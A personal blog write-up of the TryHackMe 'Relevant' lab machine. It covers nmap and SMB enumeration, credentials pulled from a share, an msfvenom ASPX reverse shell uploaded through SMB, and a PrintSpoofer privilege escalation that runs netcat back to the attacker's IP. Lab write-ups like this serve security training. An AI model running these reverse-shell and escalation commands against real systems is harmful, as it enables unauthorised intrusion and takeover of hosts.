---
title: "Relevant machine tryhackme writeup"
excerpt_separator: "<!--more-->"
date: 2024-01-08
categories:
  - TryHackMe Writeups
tags:
  - Hacking
  - Notes
  - writeup
  - ctf
---

### Relevant — TryHackMe Walkthrough

- *My writeups are more of my own mind-map than an "official" walkthrough, it may not seem straightforward sometimes but that's just the beauty of my own thinking.*

### Foothold:

- First enumeration using nmap to find all the open ports.
- We found the ports **80,135,139,445,3389,49663,49667,49669** open.

![relevant-01](/assets/images/relevant-01.png)

- Port **445** being smb we used the nmap built-in scripts for further enumeration using this line:

```bash
nmap -p 445 —script=smb-enum-shares.nse,smb-enum-users.nse @Victim_IP
```

![relevant-02](/assets/images/relevant-02.png)

 
- It seems like we know what’s next, so with a quick smb connection using:

```bash
smbclient \\\\@Victim_ip\nt4wrksv -U guest
```

- And we’re in, next we list the directory and we notice a file called passwords.txt that contains base64 encrypted passwords.
- After decrypting it turns out that its two users with their passwords.

```bash
Bob - !P@$$W0rD!123

Bill - Juw4nnaM4n420696969!$$$
```

- But those credentials seemed to be no use so after further enumeration using the open port **49663** and using ***gobuster*** we see that the nt4wrksv share is accessible on the browser, to confirm that, we were able to access the passwords.txt through that.
- So now we know we can have a shell but first let’s create a reverse shell using msfvenom.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=@my_ip LPORT=4444 -f aspx -o relevant.asp
```

- Since its a windows server machine then the shell will be executable.
- We first start a listener in our machine.
- We put the file inside the share using smb then we curl the website or simply access it.
- And that’s how we get the reverse shell and the initial foothold.

### User flag :

- There was no challenge to solve, we simply had to access the user bob’s Desktop and get the flag.

### Root flag :

- Accessing the directory of the share “c:\inetpub\wwwroot\nt4wrksv”.
- We check the privileges we have as the current user using “whoami /priv” .
- We find that ***SeImpersonatePrivilege*** is enabled which means we can abuse it to get full authority.
- And there is an exploit for that called **PrintSpoofer,** we get the compiled executable from github and put it inside the share.
- Then we download the windows **Netcat** binary and also put it inside the share.
- On another terminal we start another listener to receive the root shell.
- Inside the compromised machine we do this:

```bash
PrintSpoofer.exe -c “c:\inetpub\wwwroot\nt4wrksv\nc.exe 10.x.x.x 443 -e cmd”
```

![relevant-03](/assets/images/relevant-03.png)

- And with that we receive the shell on the second netcat listener.
- We go to the Administrator Desktop and see the root.txt file containing the root flag.